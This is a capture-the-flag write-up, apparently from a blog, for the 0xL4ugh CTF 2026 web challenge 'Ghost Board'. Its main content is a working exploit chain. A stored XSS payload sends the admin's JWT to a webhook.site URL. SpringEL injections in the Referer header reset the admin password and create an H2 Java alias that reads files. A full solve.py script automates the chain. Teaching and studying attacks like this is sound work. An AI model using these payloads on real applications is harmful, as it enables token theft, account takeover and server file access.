---
title: "[Web] Ghost Board"
description: Writeup for "Ghost Board" from 0xL4ugh CTF 2026.
date: 2026-01-26 01:00:00 +0900
categories: [CTF, 0xL4ugh CTF 2026]
tags: [Web]
toc: true
comments: false
render_with_liquid: false
---

## TL;DR

Four bugs chained together to read `/flag-*.txt`:

1. **Stored XSS** — board posts render HTML without sanitization, so we can inject JavaScript.
2. **Admin Bot** — `/api/visit` makes an admin bot open our post, so our JS runs as admin.
3. **Referer SSTI** — `/api/admin/dashboard` evaluates the `Referer` header as a SpringEL expression.
4. **H2 Java ALIAS** — via `@jdbcTemplate`, we run `CREATE ALIAS` with Java code to read the flag file.

---

## Overview

| Endpoint | Description |
|---|---|
| `POST /api/boards` | Create a board post (renders as HTML) |
| `POST /api/visit` | Trigger admin bot to visit our post |
| `GET /api/admin/dashboard` | Admin dashboard (vulnerable to Referer SSTI) |

**Attack flow:**
> XSS → steal admin JWT → SSTI via Referer → Spring bean access → H2 ALIAS → read flag

---

## Root Cause

### Stored XSS
Board post content is rendered as raw HTML. We can write a post that runs JavaScript when anyone opens it.

### Admin Bot
`/api/visit` makes the admin bot visit our post. Our injected JS runs in the admin's browser, letting us steal their JWT from `localStorage`.

### Referer SSTI
`/api/admin/dashboard` inserts the `Referer` header directly into a Thymeleaf template and evaluates it as SpringEL code.

Sending `Referer: ' + ${7*7} + '` returns `49` in the response — SSTI confirmed.

### H2 Java ALIAS
H2 database supports creating custom functions with Java code:
```sql
CREATE ALIAS myFunc AS $$ String myFunc() throws Exception { /* Java code */ } $$
```
We reach `@jdbcTemplate` through SSTI and use it to create this alias, then call it to read the flag.

---

## Exploit

### 1. Set target

```bash
export TARGET="http://challenges.ctf.sd:34513"
```

### 2. Register & Login

```bash
TOKEN="$(
  curl -s -X POST "$TARGET/api/auth/register" \
    -H "Content-Type: application/json" \
    -d '{"username":"test","password":"test"}' && \
  curl -s -X POST "$TARGET/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"test","password":"test"}' \
  | jq -r ".token"
)"
```

### 3. Post XSS payload (steal admin JWT)

Replace `WEBHOOK` with your [webhook.site](https://webhook.site) URL.

```bash
WEBHOOK="https://webhook.site/your-id-here"

curl -s -X POST "$TARGET/api/boards" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"title\":\"ghost\",\"content\":\"[].filter.constructor(\\\"new Image().src='$WEBHOOK?t='+localStorage.getItem('token')\\\")()\"}"
```

### 4. Trigger admin bot

```bash
curl -s -X POST "$TARGET/api/visit" -H "Authorization: Bearer $TOKEN"
```

Check your webhook — copy the token from `?t=...` and save it:

```bash
export ADMINJWT="(token from webhook)"
```

### 5. Verify SSTI

```bash
curl -s "$TARGET/api/admin/dashboard" \
  -H "Authorization: Bearer $ADMINJWT" \
  -H $'Referer: \x27 + ${7*7} + \x27' \
| grep "49"
```

### 6. Reset admin password via Spring beans

```bash
curl -s "$TARGET/api/admin/dashboard" \
  -H "Authorization: Bearer $ADMINJWT" \
  -H $'Referer: \x27 + ${{#u=@userRepository.findByUsername("admin").get(),#u.setPassword(@passwordEncoder.encode("Admin!234567")),@userRepository.save(#u),"OK"}[3]} + \x27'
```

Login with the new password:

```bash
ADMIN_TOKEN="$(
  curl -s -X POST "$TARGET/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"Admin!234567"}' \
  | jq -r ".token"
)"
```

### 7. Read the flag via H2 ALIAS

Create the alias:

```bash
curl -s "$TARGET/api/admin/dashboard" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H $'Referer: \x27 + ${@jdbcTemplate.execute(\'CREATE ALIAS IF NOT EXISTS GETFLAG AS $$ String getflag() throws Exception { try (java.util.stream.Stream<java.nio.file.Path> s = java.nio.file.Files.list(java.nio.file.Paths.get("/"))) { java.nio.file.Path p = s.filter(x -> x.getFileName().toString().startsWith("flag-")).findFirst().orElse(null); return p==null?"NF":java.nio.file.Files.readString(p); } } $$\')} + \x27'
```

Call it and get the flag:

```bash
curl -s "$TARGET/api/admin/dashboard" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H $'Referer: \x27 + ${@jdbcTemplate.queryForList(\'SELECT GETFLAG() AS F\')[0].get(\'F\')} + \x27' \
| grep -oE "0xL4ugh\{[^}]+\}"
```

---

## Flag

```
0xL4ugh{c0ngr47z_y0u_did_wh47_sh4d0w_did_in_bug_b0un7y_cef24d181cf97ee3342cfd5284e0bf57}
```

---

## solve.py

```python
#!/usr/bin/env python3
import argparse, json, re, sys, requests

def ssti(s, target, jwt, expr):
    r = s.get(f"{target}/api/admin/dashboard",
              headers={"Authorization": f"Bearer {jwt}",
                       "Referer": "' + ${" + expr + "} + '"}, timeout=20)
    r.raise_for_status()
    return r.text

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--adminjwt", required=True)
    ap.add_argument("--newpass", default="Admin!234567")
    args = ap.parse_args()

    s = requests.Session()
    target, jwt, newpass = args.target.rstrip("/"), args.adminjwt.strip(), args.newpass

    # 1) Reset admin password
    ssti(s, target, jwt,
         f'{{#u=@userRepository.findByUsername("admin").get(),'
         f'#u.setPassword(@passwordEncoder.encode("{newpass}")),'
         f'@userRepository.save(#u),"OK"}}[3]')
    print("[+] Password reset done")

    # 2) Login as admin
    token = s.post(f"{target}/api/auth/login",
                   json={"username": "admin", "password": newpass}).json().get("token")
    if not token:
        sys.exit("[!] Login failed")
    print("[+] Got admin token")

    # 3) Create H2 alias
    alias = ("CREATE ALIAS IF NOT EXISTS GETFLAG AS $$ "
             "String getflag() throws Exception { "
             "try (java.util.stream.Stream<java.nio.file.Path> s = "
             'java.nio.file.Files.list(java.nio.file.Paths.get("/"))) { '
             "java.nio.file.Path p = s.filter(x -> x.getFileName().toString()"
             '.startsWith("flag-")).findFirst().orElse(null); '
             'return p==null?"NF":java.nio.file.Files.readString(p); } } $$')
    ssti(s, target, token, f"@jdbcTemplate.execute('{alias.replace(chr(39), chr(39)*2)}')")
    print("[+] ALIAS created")

    # 4) Get the flag
    html = ssti(s, target, token,
                "@jdbcTemplate.queryForList('SELECT GETFLAG() AS F')[0].get('F')")
    m = re.search(r"0xL4ugh\{[^}]+\}", html)
    print("[+] FLAG:", m.group(0) if m else "not found")

if __name__ == "__main__":
    main()
```

**Usage:**
```bash
python3 solve.py --target http://challenges.ctf.sd:34513 --adminjwt "eyJhbGci..."
```
